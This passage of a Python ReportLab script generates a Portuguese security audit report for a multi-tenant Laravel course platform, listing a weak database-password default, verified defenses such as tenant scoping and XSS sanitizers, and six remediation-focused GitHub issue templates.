    <x-ui.button ...>Denunciar</x-ui.button>
@endcan"""
    ))

    # SEC-05
    story.append(render_finding_box(
        f_id="SEC-05",
        title="Fallback Vazio para DB_PASSWORD em Arquivo de Configuração",
        cat="4. Chaves Expostas / Configurações Fracas",
        sev="SEVERIDADE BAIXA",
        sev_color=COLOR_BAIXA,
        loc="config/database.php:54, 74",
        desc="O arquivo de configuração de banco de dados do framework define como valor padrão para senhas de banco uma string vazia: 'password' => env('DB_PASSWORD', ''). Caso uma variável de ambiente DB_PASSWORD não seja informada em ambientes de deploy, o sistema tentará silenciosamente conectar com senha nula em vez de falhar explicitamente.",
        impact="Tentativas acidentais de conexão sem senha em servidores mal configurados, além de não forçar a definição explícita de credenciais seguras.",
        code_snippet="""// config/database.php:54, 74
'mysql' => [
    'password' => env('DB_PASSWORD', ''), // Fallback vazio permissivo
]""",
        fix_code="""// Exigir a variável sem fallback nulo ou falhar se ausente:
'mysql' => [
    'password' => env('DB_PASSWORD'), // Sem fallback silencioso
]"""
    ))

    # ==========================================
    # 5. PONTOS FORTES E DEFESAS VERIFICADAS
    # ==========================================
    story.append(PageBreak())
    story.append(Paragraph("5. Pontos Fortes da Arquitetura & Defesas Verificadas", h1_style))
    story.append(Paragraph(
        "A auditoria constatou um padrão exemplar de segurança defensiva em diversas camadas do ecossistema. "
        "Abaixo destacam-se as 10 defesas arquiteturais mais relevantes confirmadas no código-fonte:",
        body_style
    ))

    strengths = [
        ("Isolamento Estrito Multitenant via OrgScope",
         "O modelo de isolamento utiliza a trait <code>OrgScope</code> (global Eloquent scope) que intercepta todas as consultas para injetar <code>where org_id = currentOrgId</code> e auto-injeta o <code>org_id</code> no evento <code>creating</code>. Impossibilita vazamento acidental de dados por omissão de cláusula WHERE em queries Eloquent."),
        ("Linhagem de Posse em Cascata em Modelos Filhos",
         "Modelos sem coluna <code>org_id</code> direta (como <code>Module</code>, <code>Lesson</code>, <code>Quiz</code> e <code>Certificate</code>) possuem validação sistemática nas Policies correspondentes, comparando a linhagem do curso pai (<code>$module->course->org_id</code>) contra o inquilino autenticado."),
        ("Gate de Matrícula Centralizado (EnsureStudentIsEnrolled)",
         "Middleware rígido que valida se o subdomínio/host da requisição bate com o <code>org_id</code> do curso e se o usuário autenticado possui matrícula ativa. Alunos que tentam alterar IDs na URL recebem redirecionamento ou erro 403 antes que qualquer controller execute."),
        ("Proteção contra IDOR em Reordenação e Listagens",
         "Endpoints como <code>modules.reorder</code>, <code>lessons.reorder</code> e <code>quiz-questions.reorder</code> realizam checagem estrita garantindo que cada um dos IDs enviados na lista ordenada pertença efetivamente ao contêiner pai."),
        ("Gabaritos e Tentativas de Provas Segregadas por Aluno",
         "Em <code>StudentQuizController</code>, a consulta por tentativas e resultados de avaliações exige estritamente <code>->where('user_id', auth()->id())</code>, impossibilitando que um aluno espione notas ou gabaritos de colegas alterando o ID."),
        ("Notificações Segregadas no Escopo do Usuário",
         "O <code>NotificationController</code> opera exclusivamente sobre <code>$request->user()->notifications()</code>, impedindo acesso indevido ou marcação de notificações de terceiros."),
        ("Sanitizadores Rigorosos de URLs de Vídeo (YouTube e Vimeo)",
         "As classes <code>YoutubeSanitizerService</code> e <code>VimeoSanitizerService</code> utilizam expressões regulares fechadas e aceitam exclusivamente IDs numéricos ou alfanuméricos válidos, reconstruindo URLs embed canônicas e blindando contra injeções de script (<code>javascript:</code>) ou iframes arbitrários."),
        ("Defesa em Profundidade contra XSS em Markdown e Fórum",
         "A renderização de Markdown na Central de Ajuda é executada com <code>Str::markdown($content, ['html_input' => 'strip', 'allow_unsafe_links' => false])</code>. No fórum, o <code>ForumContentSanitizerService</code> aplica <code>strip_tags()</code> na gravação e todas as views utilizam escape nativo <code>{{ }}</code>."),
        ("Construção Segura do DOM no Frontend (ForumPolling.js)",
         "O módulo de tempo real utiliza exclusivamente <code>document.createElement()</code> e <code>textContent</code> para injetar posts recebidos via API, rejeitando terminantemente o uso de <code>innerHTML</code> com dados de usuário."),
        ("Uploads de Mídia Blindados e Armazenamento Privado de PDFs",
         "O <code>FileUploadService</code> gera nomes criptográficos aleatórios (evitando sobrescrita de arquivos e path traversal), organiza o armazenamento por inquilino (<code>orgs/{org_id}/...</code>) e guarda PDFs no disco privado (<code>local</code>), com acesso mediado exclusivamente por controller autenticado e verificação de matrícula.")
    ]

    for title, desc in strengths:
        story.append(Paragraph(f"• <b>{title}:</b> {desc}", bullet_style))

    story.append(Spacer(1, 6*mm))

    # ==========================================
    # 6. MODELOS DE GITHUB ISSUES
    # ==========================================
    story.append(PageBreak())
    story.append(Paragraph("6. Templates de GitHub Issues (Prontos para Criação)", h1_style))
    story.append(Paragraph(
        "Os blocos a seguir estão formatados em Markdown padrão para rápida cópia e abertura de issues no repositório:",
        body_style
    ))
    story.append(Spacer(1, 2*mm))

    issues = [
        ("Issue 1 (SEC-04): [Segurança] Remover APP_KEY e credenciais commitadas no Git e ajustar .gitignore",
"""### Descrição do Problema
O repositório contém chaves estáticas de aplicação e senhas de banco de dados commitadas em arquivos `.env.dusk.local`, `.env.dusk.ci` e `.github/workflows/ci.yml`. Além disso, o `.gitignore` não bloqueia variações de `.env.*`.

### Arquivos Afetados
- `.env.dusk.local` (Linha 3)
- `.env.dusk.ci` (Linha 3)
- `.github/workflows/ci.yml` (Linhas 18, 21, 79)
- `.gitignore` (Linhas 3-5)

### Ações de Remediação
1. Adicionar `.env.*` ao `.gitignore`, permitindo apenas `.env.example` e `.env.*.example`.
2. Remover do índice do Git os arquivos rastreados: `git rm --cached .env.dusk.local .env.dusk.ci`.
3. Configurar a pipeline do GitHub Actions para gerar o APP_KEY em tempo de execução com `php artisan key:generate`.
4. Rotacionar imediatamente o APP_KEY em qualquer ambiente onde o código tenha sido implantado.

### Severidade
**ALTA** | **CWE-798: Use of Hard-coded Credentials**"""),

        ("Issue 2 (SEC-01): [Segurança] Filtrar denúncias de moderação por tenant no banco de dados",
"""### Descrição do Problema
Em `ForumModerationController::index()`, a consulta de denúncias pendentes busca todos os registros da tabela `forum_reports` sem filtro de organização no MySQL, aplicando a separação de inquilinos apenas em memória com `Collection::filter()`.

### Arquivos Afetados
- `app/Http/Controllers/ForumModerationController.php` (Linhas 38-48)

### Ações de Remediação
- Atualizar a query do Eloquent para filtrar pelo `org_id` da organização corrente diretamente no SQL via relacionamento morph (`whereHasMorph`), evitando carregamento desnecessário de dados de outros inquilinos na memória do PHP.

### Severidade
**MÉDIA** | **CWE-668: Exposure of Resource to Wrong Sphere**"""),

        ("Issue 3 (SEC-03): [Segurança] Validar correspondência de postable_id ao curso da rota em ForumReportController",
"""### Descrição do Problema
O endpoint `POST courses/{course}/forum/report` permite enviar no payload um `postable_id` sem validar se o tópico ou resposta pertence ao `{course}` da rota, permitindo denúncia cruzada caso o aluno esteja matriculado em ambos os cursos.

### Arquivos Afetados
- `app/Http/Controllers/ForumReportController.php` (Linhas 30-36, 56)

### Ações de Remediação
- Em `ForumReportController::store()`, verificar se o curso do `$postable` resolvido coincide com o ID do `{course}` da rota antes de invocar a ação de criação de denúncia.

### Severidade
**MÉDIA** | **CWE-639: Authorization Bypass Through User-Controlled Key (IDOR)**"""),

        ("Issue 4 (SEC-06): [Segurança] Sanitizar exportações CSV contra Formula Injection (CWE-1236)",
"""### Descrição do Problema
A exportação de dados em formato CSV em `CsvStreamExportService` e `AuditLogController` insere dados fornecidos por usuários (nomes, títulos e especialmente o cabeçalho HTTP `User-Agent`) sem neutralização de caracteres executáveis por softwares de planilha (`=`, `+`, `-`, `@`, `\\t`, `\\r`).

### Arquivos Afetados
- `app/Services/CsvStreamExportService.php` (Linhas 84-91, 115-121)
- `app/Http/Controllers/AuditLogController.php` (Linhas 77-84)

### Ações de Remediação
- Implementar sanitização prefixando com apóstrofo (`'`) qualquer célula iniciada com os caracteres de gatilho de fórmulas antes do envio para `fputcsv()`.

### Severidade
**MÉDIA** | **CWE-1236: Improper Neutralization of Formula Elements in a CSV File**"""),

        ("Issue 5 (SEC-02): [Segurança] Alinhar checagem de permissão de denúncia no Blade com ForumTopicPolicy",
"""### Descrição do Problema
Na view `resources/views/forum/show.blade.php`, a visibilidade do botão 'Denunciar' é calculada manualmente em PHP no topo da view em vez de utilizar `@can('report', $topic)`.

### Arquivos Afetados
- `resources/views/forum/show.blade.php` (Linhas 19-21)

### Ações de Remediação
- Substituir o cálculo manual por `@can('report', $topic)` ou delegar para `$user->can('report', $topic)`.

### Severidade
**BAIXA** | **CWE-1078: Inappropriate Source Code Style or Formatting**"""),

        ("Issue 6 (SEC-05): [Segurança] Remover fallback permissivo de senha vazia em config/database.php",
"""### Descrição do Problema
O arquivo de configuração `config/database.php` define `env('DB_PASSWORD', '')`, permitindo que conexões sem senha sejam tentadas caso a variável não esteja definida.

### Arquivos Afetados
- `config/database.php` (Linhas 54, 74)

### Ações de Remediação
- Alterar para `env('DB_PASSWORD')` sem valor padrão de string vazia.

### Severidade
**BAIXA** | **CWE-1188: Insecure Default Initialization of Resource**""")
    ]

    for ititle, ibody in issues:
        story.append(Paragraph(f"<b>{ititle}</b>", h2_style))
        story.append(Paragraph(format_code_block(ibody), code_style))
        story.append(Spacer(1, 4*mm))

    doc.build(story, canvasmaker=NumberedCanvas)
    print(f"[OK] Relatório PDF gerado com sucesso em: {PDF_PATH}")

if __name__ == "__main__":
    build_pdf()
